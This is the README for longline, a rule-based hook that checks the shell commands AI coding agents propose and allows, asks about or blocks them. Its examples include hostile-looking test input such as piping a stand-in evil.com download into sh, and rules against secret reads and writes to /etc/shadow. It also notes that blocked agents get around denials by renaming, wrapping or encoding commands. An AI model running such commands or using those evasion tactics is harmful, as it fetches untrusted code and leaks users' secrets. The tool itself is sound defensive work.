# longline

[![Release](https://github.com/devinbarry/longline/actions/workflows/release.yml/badge.svg?event=push)](https://github.com/devinbarry/longline/actions/workflows/release.yml)
[![crates.io](https://img.shields.io/crates/v/longline.svg)](https://crates.io/crates/longline)
[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)

A safety hook for [Claude Code](https://docs.anthropic.com/en/docs/claude-code) and [Codex CLI](https://github.com/openai/codex) that auto-allows safe shell commands so AI coding agents stop interrupting you for approval.

## What it does

`PreToolUse` hook for both runtimes. Intercepts Bash, parses with tree-sitter, evaluates against YAML rules, returns allow/ask/deny. Under Claude it also handles Read/Grep/Glob with path-based sensitive-file protection.

The day-to-day job is speed, not gatekeeping. Agents stop to ask on nearly every command; longline auto-allows the plainly safe ones and reserves prompts for things that genuinely warrant human review.

**Features:**
- Structured parsing of pipelines, redirects, command substitutions, loops, conditionals, compound statements
- Per-project overlays — extend the allowlist with whatever's safe in your repo
- Configurable safety levels (critical, high, strict) and trust levels (minimal, standard, full)
- Optional AI evaluation for inline interpreter code (`python -c`, `node -e`, etc.)
- 2300+ golden test cases
- JSONL audit log
- Fail-closed: unparseable constructs default to `ask`

## Philosophy

**Ask is the primary decision.** Deny is reserved for the small set of operations that are catastrophic, irreversible, and never legitimately needed — `rm -rf /`, `dd of=/dev/sda`, `mkfs`, `fdisk`, writes to `/dev/sd*`. Everything else asks. Allow is auto-applied for things on the allowlist.

Why almost no deny? When a hook blocks an agent, the agent doesn't stop — it pivots. It renames the file, wraps the command, encodes it, falls back to a different tool. Deny shifts the failure surface from "did the agent listen?" to "did we patch every bypass?" Ask shifts it to "is the human paying attention?" — a much clearer protocol for collaboration. For the genuinely catastrophic class, neither blocking nor asking is great, but blocking is the lesser evil because a misclick on `ask` to `rm -rf /` is unrecoverable.

For the rare legitimate use of a denied command (you really are formatting a disk), add an `allow_rules:` override in your project config. Don't weaken the rule globally.

**Deterministic rules engine, not an LLM.** Every decision is a Rust function over a parsed CST and a YAML matcher. No network calls in the hot path, no model latency, no nondeterminism. A decision typically takes milliseconds; the agent never waits on longline. Same input = same output, every time. The optional `--ask-ai` mode invokes a separate LLM judge for inline interpreter code (`python -c '...'`), and even then only to *lift* an ask to allow, never to escalate to deny.

## Repo design

- **`src/parser/`** — tree-sitter Bash CST → typed `Statement` enum. Wrappers (`env`, `timeout`, `nice`, `nohup`, `strace`, `time`, `uv run`, `command`, `builtin`) are unwrapped. Shell-c wrappers (`bash -c`, `sh -c`, `zsh -c`, etc.) are re-parsed when the inner string is safe.
- **`src/policy/`** — evaluates leaves against YAML matchers. Most-restrictive decision across all leaves wins. Allowlists checked after rules so rules can override allowlisted commands (e.g. `cat .env` asks despite `cat` being allowlisted).
- **`src/config/`** — multi-file YAML loader, project/global overlay merge, profile system.
- **`src/adapters/`** — runtime-specific JSON I/O. Claude vs Codex have different protocols; the evaluator is runtime-neutral.
- **`rules/`** — the 16+ YAML rule files, embedded at compile time. Organized by domain: `git`, `secrets`, `network`, `filesystem`, `docker`, `node`, `python`, `rust`, etc.
- **`tests/golden/`** — 2300+ test cases as YAML (command in, expected decision out). The runner is `tests/golden_tests.rs`.

## Installation

### From source

```bash
cargo install --path .
```

Rules are embedded at compile time -- no additional file copying is needed.

### From crates.io

```bash
cargo install longline
```

## Configuration

### Claude Code

Add to your Claude Code settings (`~/.claude/settings.json`):

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "longline"
          }
        ]
      },
      {
        "matcher": "Read",
        "hooks": [
          {
            "type": "command",
            "command": "longline"
          }
        ]
      },
      {
        "matcher": "Grep",
        "hooks": [
          {
            "type": "command",
            "command": "longline"
          }
        ]
      },
      {
        "matcher": "Glob",
        "hooks": [
          {
            "type": "command",
            "command": "longline"
          }
        ]
      }
    ]
  }
}
```

No `--config` flag is needed. longline loads rules in this order:
1. `--config <path>` (explicit override, if provided)
2. `~/.config/longline/rules.yaml` (user customization, if it exists)
3. Embedded defaults (compiled in)

#### Temporarily defer to Claude's auto mode

Start Claude with progress mode when you want Claude's native permission mode
to make decisions without longline participating:

```bash
LONGLINE_MODE=progress claude
```

Every longline Claude hook launched by that session returns an empty hook
result (`{}`). longline does not load policy configuration, evaluate commands,
run the AI judge, or write decision audit entries in this mode. Other Claude
hooks remain enabled, and Codex hooks and longline CLI subcommands are
unaffected. Quit that Claude session and start Claude normally to restore
longline enforcement.

### Codex CLI

Add to `~/.codex/hooks.json`:

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          { "type": "command", "command": "longline hook codex", "timeout": 30 }
        ]
      }
    ],
    "PermissionRequest": [
      {
        "matcher": "Bash",
        "hooks": [
          { "type": "command", "command": "longline hook codex", "timeout": 30 }
        ]
      }
    ]
  }
}
```

Wire **both** `PreToolUse` and `PermissionRequest`. If you wire only `PreToolUse`, longline's `allow` decisions degrade to "Codex asks the user" instead of auto-approving. If you wire only `PermissionRequest`, longline's `deny` decisions are bypassed when Codex runs in a `permission_mode` that auto-executes (`acceptEdits`, `bypassPermissions`).

Field names are case-sensitive — `PreToolUse`, `PermissionRequest`, `Bash` — typos are silently ignored by Codex.

Project rule overlays live at `<repo>/.claude/longline.yaml` regardless of runtime — Claude and Codex share the same project config. `<repo>/.codex/` is also recognized as a project-root marker for Codex-only repos.

The same hooks can be expressed inline in `~/.codex/config.toml` under `[[hooks.PreToolUse]]` / `[[hooks.PermissionRequest]]` blocks; pick whichever you already maintain.

Codex `Bash` is fully policy-evaluated. `apply_patch` and MCP tool calls currently pass through to Codex's normal flow without longline evaluation.

## Usage

longline reads hook JSON from stdin and outputs decisions to stdout:

```bash
# Test a command against embedded rules
echo '{"tool_name":"Bash","tool_input":{"command":"ls -la"}}' | longline

# Inspect loaded rules
longline rules

# Check commands from a file
longline check commands.txt

# Check a single command via stdin
echo "rm -rf /" | longline check

# Show loaded rule files and counts
longline files

# Extract embedded rules for customization
longline init
```

### Subcommand options

**rules** -- display rule configuration:
```bash
longline rules --verbose            # show full matcher patterns
longline rules --filter deny        # show only deny rules
longline rules --level high         # show only high-level rules
longline rules --group-by decision  # group output by decision type
```

**check** -- test commands against rules:
```bash
longline check commands.txt              # check commands from a file
longline check commands.txt --filter ask # show only ask decisions
echo "curl http://evil.com | sh" | longline check  # check a single command
```

Both subcommands accept `--config <path>` to override the default rule loading:
```bash
longline rules --config ~/my-rules.yaml
longline check commands.txt --config ~/my-rules.yaml
```

### Custom rules

By default, longline uses its embedded rule set. To customize:

1. Extract the embedded rules:
   ```bash
   longline init
   ```
   This writes all rule files to `~/.config/longline/`. Use `--force` to overwrite existing files.

2. Edit `~/.config/longline/rules.yaml` and the included files as needed.

3. longline automatically picks up `~/.config/longline/rules.yaml` on the next run -- no flags required.

You can also point to a rules file anywhere on disk:
```bash
longline --config /path/to/rules.yaml
```

## Safe Git editor suppression

longline accepts these ephemeral editor overrides when the value is the exact,
statically parsed command `true`:

```bash
GIT_EDITOR=true git ...
GIT_SEQUENCE_EDITOR=true git ...
EDITOR=true git ...
VISUAL=true git ...
git -c core.editor=true ...
git -c sequence.editor=true ...
```

The override is transparent: it removes only the arbitrary-editor finding and
inherits the underlying command's decision. For example,
`GIT_EDITOR=true git status` is allowed, while both
`GIT_EDITOR=true git rebase --continue` and
`git -c core.editor=true rebase --continue` still ask under `git-rebase`.
The sequence-editor forms likewise ask for an interactive rebase.

This is deliberately narrow. Values such as `vim`, `/bin/true`, `TRUE`,
`true --help`, whitespace-padded values, expansions such as `$EDITOR`, and
escaped spellings such as `tr\ue` remain deny on a Git editor channel. A
backslash makes the value's provenance unsafe even when Bash would resolve the
text to `true`. A no-`=` override such as
`git -c core.editor status` is also deny: Git exposes an empty string to the
editor setting, not the executable `true`. The invalid joined spelling
`git -ccore.editor=true status` remains fail-closed at ask. Persistent
`git config core.editor true` / `git config sequence.editor true` mutations
and every `--config-env` editor form remain deny. A safe editor override cannot
hide another unsafe assignment or config override in the same command.

Reviewed executable `env` forms are transparent wrappers too:
`env GIT_EDITOR=true git status` inherits the inner Git decision, with the
assignment propagated to policy. Transparency is limited to the bare `env`
name and the canonical `/usr/bin/env` and `/bin/env` paths, using only reviewed,
semantics-preserving flags. Options that can synthesize argv or alter execution
context—`-S`/`--split-string`, `-C`/`--chdir`, and `-a`/`--argv0`—are not
transparent. Abbreviated, unknown, or malformed options and arbitrary paths
such as `/tmp/env` also ask instead of exposing an inferred inner command.

An `env` invocation without an executable operand (`env`, `env -i`, or
`env NAME=value`) is still an environment dump and uses the active `printenv`
rule, which asks by default. Disabling or replacing that rule applies
consistently to both `printenv` and environment-dump `env` forms.

## Rules

Rules are defined in YAML with four matcher types:

- **command**: Match command name and arguments
- **pipeline**: Match command sequences (e.g., `curl | sh`)
- **redirect**: Match output redirection targets
- **git_config**: Structurally match Git command-line `-c` config overrides

A `command` matcher can pin four sub-matchers — `command`, `flags`, `args`, `env`:

| Sub-matcher | Fields |
| --- | --- |
| `flags` | `any_of` / `all_of` / `none_of` / `starts_with` against argv flag tokens. Supports combined short-flag forms (`-xvf` matches `-f`). |
| `args` | `any_of` / `all_of` / `none_of` glob patterns against argv tokens. `argv_first_not` exact-matches only argv[0] (the subcommand position; useful to scope a rule away from a specific subcommand without suppressing it on positional args later in argv). `case_insensitive: bool` lowercases pattern + arg before matching. `min_args: usize` requires the argv length **from the effective subcommand onward** (leading global value-flags like `git -C <path>` / `--git-dir` stripped, so they don't inflate the count) to be `>= min_args` — distinguishes `git config <key>` reads from `git config <key> <value>` sets, including under `git -C <path> config <key>`. |
| `env` | `any_of` glob patterns against env-var assignment NAMES on the command (e.g. `VAR=val cmd`). `case_insensitive: bool` controls parent name matching. Optional `except` entries can exempt narrowly classified values for selected names; each entry has `names`, its own `name_case_insensitive: bool`, and `value_class`. |

The structural `git_config` matcher consumes only canonical Git command-line
`-c <key[=value]>` override records:

```yaml
match:
  git_config:
    command: git
    source: cli-c
    keys: [core.editor, sequence.editor]
    key_case_insensitive: true
    except_value_class: shell-noop
```

Each matching override is evaluated independently, so a safe value cannot hide
a dangerous sibling in either order. The `shell-noop` exception applies only
to an explicit, statically identified value exactly equal to `true`; implicit
empty values, dynamic or unsafe values, paths, and differently cased values do
not qualify. A dynamic key is not claimed by this targeted matcher and remains
an `ask` through Git's canonical ambiguity gate. Persistent `git config`
operations, `--config-env`, and editor-looking tokens after the subcommand are
outside this matcher's scope. The embedded `git-c-editor-program` rule uses
this matcher, and the schema is also available to custom rules.

The shared Git global-option scanner recognizes a reviewed safety subset, not
every option accepted by every Git version. Valid but unreviewed leading
globals—including `--exec-path`, `--list-cmds`, and `--attr-source`—remain
fail-closed at `ask`; they are not stripped merely because Git accepts them.

Glob semantics (from the `glob-match` crate): `*` matches non-`/` chars; `**` matches all chars **but does not cross `/` in mid-pattern positions** — only at end-of-pattern is the cross-`/` semantic active.

Example rules:
```yaml
# Command matcher: name + flags + args
- id: rm-recursive-root
  level: critical
  match:
    command: rm
    flags:
      any_of: ["-r", "-rf", "-fr", "--recursive"]
    args:
      any_of: ["/", "/*"]
  decision: deny
  reason: "Recursive delete targeting root filesystem"

# Illustrative custom env matcher with a safe-value exception
- id: example-git-env-rce-vars
  level: critical
  match:
    command: git
    env:
      case_insensitive: true
      any_of: [GIT_SSH_COMMAND, GIT_EDITOR, GIT_SEQUENCE_EDITOR, EDITOR, VISUAL]
      except:
        - names: [GIT_EDITOR, GIT_SEQUENCE_EDITOR, EDITOR, VISUAL]
          name_case_insensitive: false
          value_class: shell-noop
  decision: deny
  reason: "Environment variable can execute a program"

# Redirect matcher: operator + target glob
- id: redirect-write-etc
  level: critical
  match:
    redirect:
      op:
        any_of: [">", ">>"]
      target:
        any_of: ["/etc/hosts", "/etc/passwd", "/etc/shadow"]
  decision: ask
  reason: "Redirect write to system configuration file"
```

Environment exceptions use same-candidate existential semantics. The parent `any_of` first selects each concrete assignment independently. An exception can filter only that same assignment when both its own name matcher and its value class match. The env matcher remains true if at least one selected assignment is dangerous; it is false when every selected assignment is exempt or when no assignment is selected. An empty parent `any_of` retains its unconditional-match behavior.

Currently the only value class is `shell-noop`. It accepts exactly the value `true` with parser provenance `PlainWord`, `RawString`, or `SafeString`. It rejects different spellings or paths such as `TRUE` and `/bin/true`, other programs such as `vim`, and even the text `true` when its provenance is `UnsafeString` because it contains an expansion, substitution, escape, or another dynamic construct.

Parent and exception name case settings are independent. For example, a case-insensitive parent may select `git_editor=true` while a case-sensitive exception listing `GIT_EDITOR` does not exempt it. Likewise, `GIT_EDITOR=true GIT_SSH_COMMAND=evil git status` still matches: the safe editor assignment cannot hide its dangerous sibling. Duplicate assignments behave the same way, so a safe `GIT_EDITOR=true` cannot hide a second unsafe `GIT_EDITOR=vim` in either order.

### Rules organization

Rules are split across multiple files referenced by `rules.yaml`:

```
rules/
  rules.yaml              # Top-level config, lists files to include
  core-allowlist.yaml     # Generic safe commands (ls, cat, grep...)
  git.yaml                # Git allowlist + destructive git rules
  cli-tools.yaml          # gh/glab/glp allowlist + API mutation rules
  codex.yaml              # OpenAI codex CLI allowlist
  filesystem.yaml         # Filesystem destruction rules
  secrets.yaml            # Secrets exposure rules
  django.yaml             # Django allowlist + destructive rules
  package-managers.yaml   # pip/npm/cargo/etc allowlist + install rules
  network.yaml            # Network/exfiltration rules
  docker.yaml             # Docker destructive rules
  system.yaml             # System config modification rules
  interpreters.yaml       # Safe interpreter invocations
```

Use `longline files` to see loaded files and their rule/allowlist counts.

## Safety levels

- **critical**: Catastrophic operations (rm -rf /, dd to disk, etc.)
- **high**: Dangerous operations (secret access, network exfiltration)
- **strict**: Potentially risky operations requiring review

## Decision model

- `allow`: Command is safe, proceed without prompting
- `ask`: Command requires user approval
- `deny`: Command is blocked (can be downgraded to `ask` with `--ask-on-deny`)

## AI Judge

For inline interpreter code (e.g., `python -c "..."`), longline can use AI to evaluate the embedded code instead of defaulting to `ask`.

**Strict mode** (`--ask-ai`): Conservative evaluation, flags potential dangers.

**Lenient mode** (`--ask-ai-lenient` or `--lenient`): Prefers allow for normal development tasks like file reading, Django template loading, and standard dev operations.

```bash
longline --ask-ai          # strict
longline --ask-ai-lenient  # lenient
```

These flags combine with the hook command in your settings:
```json
{
  "type": "command",
  "command": "longline --ask-ai-lenient"
}
```

The judge is **lift-only**: it is consulted only when a command is already going to `ask`, and can only turn that `ask` into `allow`, never escalate to `deny`. Any timeout or unparseable output falls back to `ask`.

### How the judge runs

The primary provider (`codex`) is retried with exponential backoff on transient failures. After `hedge_after_secs` (default 30s) with no verdict, a second provider (`claude -p`) is launched concurrently; the first valid verdict wins. The friction `ask` is reached only after the full `total_budget_secs` budget (default 90s) is spent or both providers are disabled.

The `claude -p` hedge is enabled by default and self-disables if `claude` is not on PATH (codex carries). Set `fallback_command: ""` in `ai-judge.yaml` to use codex only.

### AI judge configuration (`~/.config/longline/ai-judge.yaml`)

| Field | Default | Description |
|---|---|---|
| `command` | `codex exec …` | Primary judge provider command |
| `fallback_command` | `claude -p …` | Secondary hedge provider; `""` disables |
| `timeout` | `45` | Per-attempt timeout in seconds |
| `total_budget_secs` | `90` | Total wall-clock budget before `ask` fallback |
| `hedge_after_secs` | `30` | Seconds before launching the fallback concurrently |
| `backoff_base_ms` | `500` | Initial retry backoff in milliseconds |
| `backoff_max_ms` | `4000` | Maximum retry backoff in milliseconds |
| `relaunch_floor_ms` | `250` | Minimum delay before re-launching after a clean empty exit |
| `max_attempts` | `40` | Maximum total provider launches |
| `max_nonconforming` | `2` | Unparseable responses tolerated before disabling a provider |

**Back-compat:** if you previously set `timeout:` without `total_budget_secs:`, your old wall-clock ceiling is preserved (`total_budget_secs` defaults to your `timeout` value).

### Judge settings file

`longline init` writes `~/.config/longline/judge-claude-settings.json`, a longline-owned settings file used exclusively by the `claude -p` hedge. It pins `cleanupPeriodDays: 3650` so the hedge never runs under a transcript-GC-enabling setting, and disables telemetry and autoupdate. longline validates and atomically repairs this file before each hedge launch. The file is inert for any Claude session that does not reference it via `--settings`.

### Audit log

Judged commands gain a structured `judge` field in the JSONL entry:

```jsonc
{
  "runtime": "claude",
  "profile": "default",
  "judge": {
    "provider_final": "codex",
    "attempts": [
      { "provider": "codex", "outcome": "verdict", "latency_ms": 3200 }
    ],
    "phase_reached": "primary",
    "outcome": "verdict",
    "failure_mode": {}
  },
  ...
}
```

Non-judge log lines are unchanged.

## Profiles

### Why profiles exist

Different runtimes and session contexts need different rule sets. Codex tooling is materially sloppier than Claude tooling and benefits from tighter rules; a specialized context such as an afterhours daemon supervising Codex may need stricter rules still, while an interactive Claude session can be more permissive. Profiles let one binary serve all of these without duplicating `rules.yaml`. If you run only one runtime in one mode, you do not need profiles — the implicit `default` profile applies.

### Conceptual model

A profile is a named overlay that layers on top of the full embedded/global/project rule stack. The resolution order from lowest to highest precedence is:

```
embedded defaults (rules/rules.yaml)
  → global overlay top-level fields (~/.config/longline/longline.yaml)
  → project overlay top-level fields (<repo>/.claude/longline.yaml)
  → resolved profile (extends chain, root → leaf)
  = final config
```

Profiles inherit from one another through a single-parent `extends:` chain. Every profile that omits `extends:` implicitly extends the built-in `default` profile (zero extra rules, no safety-level override). The `default` profile always exists; you do not need to declare it.

Note: because every profile implicitly extends `default`, adding content to a user-defined `profiles.default` block silently affects every other profile in the merged map.

### Schema reference

Add `defaults:` and `profiles:` top-level keys to your global overlay (`~/.config/longline/longline.yaml`) or project overlay (`<repo>/.claude/longline.yaml`):

```yaml
defaults:
  claude: <profile-name>     # used when --profile is not passed on hook claude
  codex: <profile-name>      # used when --profile is not passed on hook codex

profiles:
  <profile-name>:
    extends: <parent-name>   # parent profile to inherit from; default: "default"
                             # may not be redeclared across overlays once set
    safety_level: ...        # critical | high | strict; overrides inherited value
    rules:                   # additional Rule entries; same schema as elsewhere
      - id: ...              # required; used for id-collision replacement
        level: ...           # critical | high | strict
        match: { ... }       # command / pipeline / redirect / git_config matcher
        decision: ...        # allow | ask | deny
        reason: "..."        # required; shown in audit log and UI
    allowlists:
      commands:
        - command: ...
          trust: ...         # minimal | standard | full
          reason: "..."      # optional
    ai_judge:
      prompt: |              # fully replaces inherited prompt (must include
        ...                  # {language}, {code}, {cwd} placeholders)
```

**Per-field merge semantics (parent → child, and global → project within a profile):**

- `extends:` — fixes the profile's parent; may not be redeclared once a profile name appears in any overlay. If a project needs a different inheritance chain, use a new profile name.
- `safety_level:` — child overrides parent; omitted means inherit.
- `rules:` — child appends; a rule with the same `id` as an existing rule **replaces** it (id-collision replacement). This is how you weaken: redefine a parent's `deny` rule as `allow` using the same `id`.
- `allowlists:` — child appends; no removal mechanism. Because policy evaluates rules before the allowlist, use a `deny` rule to genuinely tighten rather than relying on allowlist ordering.
- `ai_judge.prompt:` — child fully replaces parent; omitted means inherit.

### Resolution precedence

**Name resolution** — four-step ladder, first match wins:

1. `--profile <name>` CLI flag
2. Project overlay's `defaults.<runtime>`
3. Global overlay's `defaults.<runtime>`
4. Built-in fallback: `default`

**Field precedence** within the resolved config — highest first:

1. CLI flag (`--safety-level`)
2. Project overlay's entry for the resolved profile name
3. Global overlay's entry for the resolved profile name
4. Profile `extends:` chain (root → leaf), ancestor contributions only
5. Top-level overlay contributions (`override_safety_level`, etc.)
6. Built-in defaults (embedded `rules/rules.yaml`)

### Merge example

Global overlay (`~/.config/longline/longline.yaml`) — looser, used as the shared baseline:

```yaml
defaults:
  codex: strict

profiles:
  strict:
    extends: default
    safety_level: strict
    rules:
      - id: codex-no-curl-pipe-sh
        level: high
        match:
          pipeline:
            stages:
              - { command: curl }
              - { command: sh }
        decision: deny
        reason: "strict: do not pipe curl into sh"
      - id: codex-glab-mr-create-ok
        level: high
        match:
          command: glab
          args: { all_of: ["mr", "create"] }
        decision: allow
        reason: "strict allows opening MRs"
```

Project overlay (`<repo>/.claude/longline.yaml`) — a production-deploy repo that tightens:

```yaml
profiles:
  strict:
    rules:
      - id: this-repo-no-cargo-publish
        level: high
        match:
          command: cargo
          args: { any_of: ["publish"] }
        decision: deny
        reason: "this repo never publishes from Codex sessions"
      - id: codex-glab-mr-create-ok          # same id as global → project wins
        level: high
        match:
          command: glab
          args: { all_of: ["mr", "create"] }
        decision: deny
        reason: "this repo: MRs must come from local dev, not Codex"
```

Resolved `strict` profile when Codex runs in this repo:

- `extends: default` (from global; project did not override)
- `safety_level: strict` (from global; project did not override)
- Three rules:
  - `codex-no-curl-pipe-sh` — global, unchanged; `curl | sh` is denied
  - `this-repo-no-cargo-publish` — project-added; `cargo publish` is denied in this repo only
  - `codex-glab-mr-create-ok` — redefined as `deny` by the project; MRs cannot be opened from inside Codex sessions in this repo (project tightened what the global profile allowed)

### CLI reference

```bash
longline hook claude --profile <name>   # explicit profile for Claude sessions
longline hook codex  --profile <name>   # explicit profile for Codex sessions
longline check       --profile <name> '<command>'
longline rules       --profile <name>   # annotates replaced builtins
longline files       --profile <name>   # validates profile loads cleanly
longline profiles                        # table of all profiles (all overlays)
longline profiles --runtime codex        # resolved default profile for codex
longline profiles --json                 # machine-readable; stable within minor versions
```

`--profile` is also honoured by the bare `longline` form (back-compat alias for `longline hook claude`).

### Audit log

Every JSONL entry in `~/.claude/hooks-logs/longline.jsonl` and `~/.codex/hooks-logs/longline.jsonl` carries a `profile` field:

```jsonc
{
  "runtime": "codex",
  "profile": "strict",
  ...
}
```

Users not using profiles see `"profile": "default"` on every entry.

The reserved sentinel `"profile": "unresolved"` appears only on Codex fail-open entries where profile resolution itself failed. User-defined profiles may not be named `unresolved`.

### Weakening note

Profile rules can **weaken** embedded denies by reusing the same rule `id` with a different decision. This is intentional per the longline threat model (optimize for false-positive elimination; the operator is trusted), but it means you can silently disable safety rails. After defining any profile, run:

```bash
longline rules --profile <name>
```

to confirm the resolved rule set. The output annotates each profile-source rule that replaced a same-id builtin with `[overrides id 'foo' from builtin]`.

## Supported bash constructs

The parser handles:
- Simple commands, pipelines (`|`), lists (`&&`, `||`, `;`)
- Subshells `(...)`, command substitutions `$(...)` and backticks
- for/while loops, if/else, case statements
- Compound statements `{ ...; }`, function definitions
- Test commands `[[ ... ]]`, comments
- Transparent wrappers: `env`, `timeout`, `nice`, `nohup`, `strace`, `time`, `uv run`
- `find -exec` / `xargs` inner command extraction
- Command substitutions in assignments, string nodes, and redirect targets

All commands within these constructs are extracted and evaluated. Commands invoked via absolute paths (e.g., `/usr/bin/rm`) are matched by basename. Unknown or unparseable constructs become `Opaque` nodes and result in `ask` (fail-closed).

## License

MIT
